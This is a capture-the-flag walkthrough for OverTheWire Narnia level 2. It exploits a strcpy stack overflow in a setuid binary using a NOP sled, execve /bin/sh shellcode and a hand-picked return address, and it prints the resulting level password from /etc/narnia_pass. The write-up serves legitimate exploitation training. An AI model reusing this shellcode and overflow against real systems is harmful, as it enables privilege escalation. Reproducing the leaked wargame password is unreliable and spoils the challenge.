#### Narnia Level 1 → Level 2

```sh
➜  ~ ssh narnia2@narnia.labs.overthewire.org -p 2226
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
narnia2@narnia.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

narnia2@narnia:~$
```

```sh
narnia2@narnia:~$ cd /narnia/
narnia2@narnia:/narnia$ ll
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 ./
drwxr-xr-x 25 root    root    4096 Nov 21 07:46 ../
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0*
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1*
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2*
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3*
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4*
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5*
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6*
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7*
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8*
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
narnia2@narnia:/narnia$
```

```sh
narnia2@narnia:/narnia$ cat narnia2.c
```

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

```sh
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$
```

```
128 + 4 + 4 -> 136
```

```sh
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x41"*136')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnarnia2@narnia:/narnia$
```

```sh
narnia2@narnia:/narnia$ gdb ./narnia2 -q
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "\x41"*140')
Starting program: /narnia/narnia2 $(python -c 'print "\x41"*140')

Program received signal SIGSEGV, Segmentation fault.
0xf7e2f600 in __libc_start_main () from /lib32/libc.so.6
(gdb)
```

```sh
narnia2@narnia:/narnia$ gdb ./narnia2 -q
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "\x41"*144')
Starting program: /narnia/narnia2 $(python -c 'print "\x41"*144')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

```sh
narnia2@narnia:/narnia$ gdb ./narnia2 -q
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804844d <+0>:	push   %ebp
   0x0804844e <+1>:	mov    %esp,%ebp
   0x08048450 <+3>:	and    $0xfffffff0,%esp
   0x08048453 <+6>:	sub    $0x90,%esp
   0x08048459 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x0804845d <+16>:	jne    0x8048480 <main+51>
   0x0804845f <+18>:	mov    0xc(%ebp),%eax
   0x08048462 <+21>:	mov    (%eax),%eax
   0x08048464 <+23>:	mov    %eax,0x4(%esp)
   0x08048468 <+27>:	movl   $0x8048540,(%esp)
   0x0804846f <+34>:	call   0x8048300 <printf@plt>
   0x08048474 <+39>:	movl   $0x1,(%esp)
   0x0804847b <+46>:	call   0x8048320 <exit@plt>
   0x08048480 <+51>:	mov    0xc(%ebp),%eax
   0x08048483 <+54>:	add    $0x4,%eax
   0x08048486 <+57>:	mov    (%eax),%eax
   0x08048488 <+59>:	mov    %eax,0x4(%esp)
   0x0804848c <+63>:	lea    0x10(%esp),%eax
   0x08048490 <+67>:	mov    %eax,(%esp)
   0x08048493 <+70>:	call   0x8048310 <strcpy@plt>
   0x08048498 <+75>:	lea    0x10(%esp),%eax
   0x0804849c <+79>:	mov    %eax,0x4(%esp)
   0x080484a0 <+83>:	movl   $0x8048554,(%esp)
   0x080484a7 <+90>:	call   0x8048300 <printf@plt>
   0x080484ac <+95>:	mov    $0x0,%eax
   0x080484b1 <+100>:	leave
   0x080484b2 <+101>:	ret
End of assembler dump.
(gdb)
```

[``Linux/x86 - execve /bin/sh XOR Encoded Shellcode (55 bytes)``](https://www.exploit-db.com/exploits/13456/)

```sh
narnia2@narnia:/narnia$ python -c 'print len("\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42")'
55
narnia2@narnia:/narnia$
```

- Exploit

	- (140-55) ``NOP`` + 55 ``Shellcode`` + 4 ``return Address`` &rarr; 144
	- 85 ``NOP`` + 55 ``Shellcode`` + 4 ``return Address`` &rarr; 144

```sh
narnia2@narnia:/narnia$ gdb ./narnia2 -q
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "\x90"*85 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" +"\x41\x41\x41\x41"')
Starting program: /narnia/narnia2 $(python -c 'print "\x90"*85 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" +"\x41\x41\x41\x41"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/150x $esp
0xffffd5a0:	0x00000000	0xffffd634	0xffffd640	0x00000000
0xffffd5b0:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd5c0:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd5d0:	0x00000000	0x62bdbb2c	0x58fd153c	0x00000000
0xffffd5e0:	0x00000000	0x00000000	0x00000002	0x08048350
0xffffd5f0:	0x00000000	0xf7fee010	0xf7fe88a0	0xf7ffd000
0xffffd600:	0x00000002	0x08048350	0x00000000	0x08048371
0xffffd610:	0x0804844d	0x00000002	0xffffd634	0x080484c0
0xffffd620:	0x08048520	0xf7fe88a0	0xffffd62c	0xf7ffd918
0xffffd630:	0x00000002	0xffffd767	0xffffd777	0x00000000
0xffffd640:	0xffffd808	0xffffd81c	0xffffd82c	0xffffd840
0xffffd650:	0xffffd862	0xffffd875	0xffffd87e	0xffffd88b
0xffffd660:	0xffffde13	0xffffde1e	0xffffde2a	0xffffdeb3
0xffffd670:	0xffffdeca	0xffffded9	0xffffdee5	0xffffdef6
0xffffd680:	0xffffdeff	0xffffdf12	0xffffdf1a	0xffffdf2c
0xffffd690:	0xffffdf3c	0xffffdf51	0xffffdf86	0xffffdfa6
0xffffd6a0:	0xffffdfc6	0x00000000	0x00000020	0xf7fd8be0
0xffffd6b0:	0x00000021	0xf7fd8000	0x00000010	0x178bfbff
0xffffd6c0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd6d0:	0x00000003	0x08048034	0x00000004	0x00000020
0xffffd6e0:	0x00000005	0x00000008	0x00000007	0xf7fd9000
0xffffd6f0:	0x00000008	0x00000000	0x00000009	0x08048350
0xffffd700:	0x0000000b	0x000036b2	0x0000000c	0x000036b2
0xffffd710:	0x0000000d	0x000036b2	0x0000000e	0x000036b2
0xffffd720:	0x00000017	0x00000000	0x00000019	0xffffd74b
0xffffd730:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd75b
0xffffd740:	0x00000000	0x00000000	0xf7000000	0x7d510ec2
0xffffd750:	0xf369ce8b	0x6298f2d8	0x6957e463	0x00363836
0xffffd760:	0x00000000	0x2f000000	0x6e72616e	0x6e2f6169
0xffffd770:	0x696e7261	0x90003261	0x90909090	0x90909090
0xffffd780:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd790:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7c0:	0x90909090	0x90909090	0x90909090	0x46b0c031
0xffffd7d0:	0xc931db31	0x16eb80cd	0x88c0315b	0x5b890743
0xffffd7e0:	0x0c438908	0x4b8d0bb0	0x0c538d08	0xe5e880cd
0xffffd7f0:	0x2fffffff	0x2f6e6962
(gdb)
```

Possible return addresses &rarr; ``0xffffd780``, ``0xffffd790``, ``0xffffd7a0``, ``0xffffd7b0``

```
0xffffd780:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd790:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b0:	0x90909090	0x90909090	0x90909090	0x90909090
```

```sh
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*85 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90\xd7\xff\xff"')
$ cat /etc/narnia_pass/narnia3
vaequeezee
```